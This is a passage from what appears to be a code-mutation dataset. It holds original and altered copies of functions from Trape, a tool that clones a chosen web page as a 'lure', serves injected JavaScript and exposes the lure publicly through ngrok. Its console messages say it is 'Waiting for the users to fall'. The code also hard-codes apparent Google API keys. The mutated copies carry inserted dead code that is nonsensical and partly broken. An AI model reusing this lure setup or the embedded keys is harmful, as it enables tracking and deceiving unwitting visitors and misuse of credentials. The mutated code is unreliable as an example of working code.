'/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey",
            "def __init__(self, stat=0):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.name_trape = 'Trape'\n    self.version = '2.1'\n    self.stats_path = 'ngrok'\n    self.home_path = utils.generateToken(18)\n    self.logout_path = utils.generateToken(6)\n    self.remove_path = utils.generateToken(14)\n    self.injectURL = utils.generateToken(12) + '.js'\n    self.stats_key = utils.generateToken(24)\n    self.date_start = time.strftime('%Y-%m-%d - %H:%M:%S')\n    self.stat = stat\n    self.localIp = '127.0.0.1'\n    self.nGrokUrl = ''\n    self.JSFiles = ({'path': 'base.js', 'src': utils.generateToken(12)}, {'path': 'libs.min.js', 'src': utils.generateToken(12)}, {'path': 'login.js', 'src': utils.generateToken(12)}, {'path': 'payload.js', 'src': utils.generateToken(12)}, {'path': 'trape.js', 'src': utils.generateToken(12)}, {'path': 'vscript.js', 'src': utils.generateToken(12)}, {'path': 'custom.js', 'src': utils.generateToken(12)})\n    self.CSSFiles = ({'path': '/static/img/favicon.ico', 'src': utils.generateToken(12)}, {'path': '/static/img/favicon.png', 'src': utils.generateToken(12)}, {'path': '/static/css/base-icons.css', 'src': utils.generateToken(12)}, {'path': '/static/css/styles.css', 'src': utils.generateToken(12)}, {'path': '/static/css/normalize.min.css', 'src': utils.generateToken(12)}, {'path': '/static/css/services-icons.css', 'src': utils.generateToken(12)})\n    if self.stat == 1:\n        c = http.client.HTTPConnection('www.google.com', timeout=5)\n        try:\n            c.request('HEAD', '/')\n            c.close()\n        except Exception as e:\n            c.close()\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'NOTICE: ' + utils.Color['white'] + 'Trape needs Internet connection for working' + '\\n\\t')\n            sys.exit(0)\n        if not os.path.exists('trape.config'):\n            self.trape_config()\n        try:\n            config_trape = json.load(open('trape.config'))\n        except Exception as error:\n            os.remove('trape.config')\n            self.trape_config()\n        self.ngrok = config_trape['ngrok_token']\n        self.gmaps = config_trape['gmaps_api_key']\n        self.ipinfo = config_trape['ipinfo_api_key']\n        if self.gmaps == '':\n            self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'\n        self.googl = config_trape['gshortener_api_key']\n        if self.googl == '':\n            self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'\n        parser = argparse.ArgumentParser('python3 trape.py -u <<Url>> -p <<Port>>')\n        parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')\n        parser.add_argument('-p', '--port', dest='port', help='Insert your port')\n        parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')\n        parser.add_argument('-l', '--local', dest='local', help='Insert your home file')\n        parser.add_argument('-n', '--ngrok', dest='ngrok', help='Insert your ngrok Authtoken', action='store_true')\n        parser.add_argument('-ic', '--injectcode', dest='injc', help='Insert your custom REST API path')\n        parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update trape to the latest version')\n        options = parser.parse_args()\n        self.type_lure = 'global'\n        if options.update:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('Updating...' + ' ' + utils.Color['blue'] + 'trape' + utils.Color['white'] + '...' + '\\n')\n            subprocess.check_output(['git', 'reset', '--hard', 'origin/master'])\n            subprocess.check_output(['git', 'pull'])\n            utils.Go('Trape Updated... Please execute again...')\n            sys.exit(0)\n        if options.url is None:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('| v' + utils.Color['redBold'] + self.version + utils.Color['white'] + ' |')\n            utils.Go('--------' + '\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['greenBold'] + '!' + utils.Color['whiteBold'] + ']' + ' ' + utils.Color['white'] + 'Enter the information requested below to complete the execution' + utils.Color['white'])\n            utils.Go('')\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        if options.port is None:\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        while utils.checkPort(int(options.port)) == False:\n            utils.Go('\\x1b[H\\x1b[J')\n            utils.Go('----------------------------------------------')\n            utils.Go('' + ' ' + utils.Color['redBold'] + 'TRAPE' + utils.Color['white'] + ' {' + utils.Color['yellowBold'] + 'stable' + utils.Color['white'] + '}' + utils.Color['white'] + ' - ' + 'Osint and analytics tool' + ' ' + '<' + utils.Color['white'])\n            utils.Go('----------------------------------------------')\n            utils.Go('\\n')\n            utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR:' + ' ' + utils.Color['whiteBold'] + 'The port: ' + options.port + utils.Color['white'] + ' ' + 'is not available, It was previously used (' + utils.Color['yellow'] + 'Use another port' + utils.Text['end'] + ')' + '\\n\\n')\n            options.port = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' What is your port to generate the server?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            options.url = input(utils.Color['blueBold'] + '-' + utils.Color['white'] + ' Enter a URL to generate the lure' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n        utils.Go('')\n        utils.Go(utils.Color['greenBold'] + '-' + utils.Color['white'] + ' Successful ' + utils.Color['greenBold'] + 'startup' + utils.Color['white'] + ', get lucky on the way!' + utils.Color['white'])\n        utils.Go('')\n        time.sleep(0.1)\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect(('8.8.8.8', 80))\n        self.localIp = s.getsockname()[0]\n        self.app_port = int(options.port)\n        self.url_to_clone = str(options.url)\n        if self.url_to_clone[0:4] != 'http':\n            self.url_to_clone = 'http://' + self.url_to_clone\n        self.victim_path = options.url.replace('http://', '').replace('https://', '')\n        if options.ngrok or self.ngrok != '':\n            if self.ngrok == '':\n                utils.Go('\\x1b[H\\x1b[J')\n                self.ngrok = input('What is your nGrok token?' + ' ' + utils.Color['yellow'] + ':~> ' + utils.Color['white'])\n            if self.ngrok != '':\n                from core.ngrok import ngrok\n                import os.path as path\n                v_ngrok = ngrok(self.ngrok, self.app_port, stat, self.stats_path)\n            else:\n                utils.Go(utils.Color['whiteBold'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + \"Your nGrok authtoken can't be empty\")\n        if options.injc:\n            self.injectURL = options.injc\n        if options.accesskey:\n            self.stats_key = options.accesskey"
        ]
    },
    {
        "func_name": "header",
        "original": "def header(self):\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')",
        "mutated": [
            "def header(self):\n    if False:\n        i = 10\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + utils.Color['whiteBold'] + ']' + utils.Color['redBold'] + ' ' + 'ERROR: ' + ' ' + utils.Color['white'] + e.message)\n                utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n        utils.Go('\\n' + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '>' + utils.Color['white'] + ']' + utils.Color['whiteBold'] + ' ' + 'Start time:' + ' ' + utils.Color['white'] + self.date_start)\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '?' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Do not forget to close ' + self.name_trape + ', after use. Press Control C' + ' ' + utils.Color['white'] + '\\n')\n        utils.Go(utils.Color['white'] + '[' + utils.Color['greenBold'] + '\u00a1' + utils.Color['white'] + ']' + utils.Color['white'] + ' ' + 'Waiting for the users to fall...' + '\\n')",
            "def header(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.stat == 1:\n        utils.banner()\n        changeLog = requests.get('https://raw.githubusercontent.com/jofpin/trape/master/version.txt', timeout=4)\n        changeLog = changeLog.text.split(' ')[1]\n        changeLog = changeLog.strip()\n        if changeLog != self.version:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['yellowBold'] + 'NEW VERSION IS AVAILABLE: ' + utils.Color['white'] + 'v' + utils.Color['redBold'] + changeLog + utils.Color['white'] + ' ' + '(install changes)')\n            utils.Go('')\n        else:\n            utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellowBold'] + '@' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['whiteBold'] + ' ' + 'UPDATES:' + ' ' + utils.Color['greenBold'] + 'RUNNING RECENT VERSION' + utils.Color['white'])\n            utils.Go('')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'LOCAL INFORMATION' + utils.Text['end'])\n        utils.Go('\\t' + '-------------------')\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Lure for the users: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.victim_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your REST API path: ' + utils.Color['blue'] + 'http://' + self.localIp + ':' + str(self.app_port) + '/' + self.injectURL + utils.Color['white'])\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel Link: ' + utils.Color['blue'] + 'http://127.0.0.1:' + utils.Color['blue'] + str(self.app_port) + '/' + self.stats_path)\n        utils.Go(utils.Color['white'] + '\\t' + utils.Color['green'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Your Access key: ' + utils.Color['blue'] + self.stats_key + utils.Color['white'])\n        utils.Go('')\n        if self.ngrok != '':\n            if self.googl == '':\n                self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'\n            try:\n                opener = urllib.request.build_opener()\n                pLog = 4040\n                ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                time.sleep(0.5)\n                ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos <= 0:\n                    time.sleep(4)\n                    ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\\n', '').replace(' ', '')\n                    ngrokUrlPos = ngrokStatus.find('ngrok.io')\n                if ngrokUrlPos >= 0:\n                    ngrokStatus = ngrokStatus[ngrokUrlPos - 25:ngrokUrlPos + 28]\n                    ngrokUrlPos = ngrokStatus.find('http')\n                    ngrokUrlPos2 = ngrokStatus.find('.io')\n                    ngrokStatus = ngrokStatus[ngrokUrlPos:ngrokUrlPos2] + '.io'\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['whiteBold'] + 'PUBLIC INFORMATION' + utils.Text['end'])\n                    utils.Go('\\t' + '-------------------')\n                    r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)\n                    self.nGrokUrl = ngrokStatus.replace('https', 'http')\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Public lure: ' + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])\n                    utils.Go(utils.Color['white'] + '\\t' + utils.Color['yellow'] + '>' + utils.Color['white'] + '-' + utils.Color['blue'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + ' Control Panel link: ' + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])\n                else:\n                    utils.Go(utils.Color['red'] + '\\t' + utils.Color['green'] + '-' + utils.Color['white'] + '--' + utils.Color['red'] + '=' + utils.Color['white'] + '[' + utils.Color['white'] + \" We can't connect with nGrok \" + utils.Color['white'])\n            except Exception as e:\n                utils.Go(utils.Color['white'] + '[' + utils.Color['redBold'] + 'x' + 